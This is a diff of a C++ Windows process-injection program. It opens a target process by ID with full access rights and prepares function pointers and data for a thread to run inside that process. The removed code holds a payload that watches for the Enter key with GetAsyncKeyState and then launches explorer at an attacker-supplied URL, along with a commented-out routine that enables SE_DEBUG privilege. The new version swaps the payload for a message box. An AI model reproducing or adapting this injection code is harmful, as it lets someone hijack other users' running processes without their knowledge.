@@ -2,28 +2,30 @@
 
 #include <windows.h>
 #include <string>
+#include <vector>
+#include <sstream>
 
 #define DATA_CHUNK_SIZE 1024
 #define CODE_CHUNK_SIZE 1024
 
 #define ASSERT( expr, msg )\
   if ( !expr ){\
-  MessageBox( NULL, msg, "Damn", MB_ICONERROR );\
+  MessageBoxA( NULL, msg, "Damn", MB_ICONERROR );\
   exit( -1 );}
 
 typedef BOOL ( WINAPI *CREATEPROCFN )( LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, 
                                        LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, 
                                        LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION );
-
 typedef SHORT ( WINAPI *GETASYNCKEYSTATEFN )( int vKey );
-
 typedef VOID ( WINAPI *SLEEPFN )( DWORD );
+typedef int ( WINAPI *MESSAGEBOXFN )( HWND, LPCSTR, LPCSTR, UINT );
 
 struct InjData
 {
   CREATEPROCFN        fnCreateProcess;
   GETASYNCKEYSTATEFN  fnGetAsyncKeyState;
   SLEEPFN             fnSleep;
+  MESSAGEBOXFN        fnMessageBox;
 
   STARTUPINFOA si;
   PROCESS_INFORMATION pi;
@@ -32,41 +34,28 @@ struct InjData
 
 static DWORD ThreadFunc( InjData *pData )
 {
-  while ( true )
-  {
-    if ( pData->fnGetAsyncKeyState( VK_RETURN ) & 0x8000 )
-    {
-      pData->fnCreateProcess( NULL, pData->szCmd, NULL, NULL, FALSE, 0, NULL, NULL, &pData->si, &pData->pi );
-    }
-    pData->fnSleep( 10 );
-  }
+  pData->fnMessageBox( NULL, NULL, NULL, MB_ICONEXCLAMATION );
 
   return 0;
 }
 static void DummyFunc() {}
 
-//void SetPrivileges( HANDLE hThread )
-//{
-//  HANDLE hToken;
-//
-//  ASSERT( OpenThreadToken( hThread, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken ), "opening access token failed =(" );
-//
-//  TOKEN_PRIVILEGES tp;
-//  memset( &tp, 0, sizeof( tp ) );
-//  LUID luid;
-//
-//  LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &luid );
-//
-//  tp.PrivilegeCount = 1;
-//  tp.Privileges[0].Luid = luid;
-//
-//  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-//
-//  AdjustTokenPrivileges( hToken, FALSE, &tp, sizeof( TOKEN_PRIVILEGES ), NULL, NULL );
-//}
+typedef std::vector<std::string> StringVec;
 
-int main( int argc, char *argv[] )
+int APIENTRY WinMain( HINSTANCE, HINSTANCE, LPSTR args, int )
 {
+  StringVec argv;
+  std::stringstream ssArgs( args );
+  argv.push_back( "hai2u" );
+  while ( !ssArgs.eof() )
+  {
+    std::string str;
+    ssArgs >> str;
+    if ( !str.empty() )
+      argv.push_back( str );
+  }
+  int argc = (int)argv.size();
+
   ASSERT( ( argc == 3 ), ( std::string( argv[0] ) + " [site url] [process id]" ).c_str() );
 
   // data
@@ -80,6 +69,7 @@ int main( int argc, char *argv[] )
   injData.fnCreateProcess     = &CreateProcessA;
   injData.fnGetAsyncKeyState  = &GetAsyncKeyState;
   injData.fnSleep             = &Sleep;
+  injData.fnMessageBox        = &MessageBoxA;
   strcpy( injData.szCmd, ( std::string( "explorer " ) + argv[1] ).c_str() );
   memset( &injData.si, 0, sizeof( injData.si ) );
   injData.si.cb = sizeof( injData.si );
@@ -87,7 +77,7 @@ int main( int argc, char *argv[] )
 
   // Step 1: Get full access to remote process
   //SetPrivileges(  );
-  hProc = OpenProcess( PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi( argv[2] ) );
+  hProc = OpenProcess( PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi( argv[2].c_str() ) );
   ASSERT( hProc != NULL, "opening process with full access rights failed =(" );
 
   // Step 2: Allocate block of memory for data in remote process
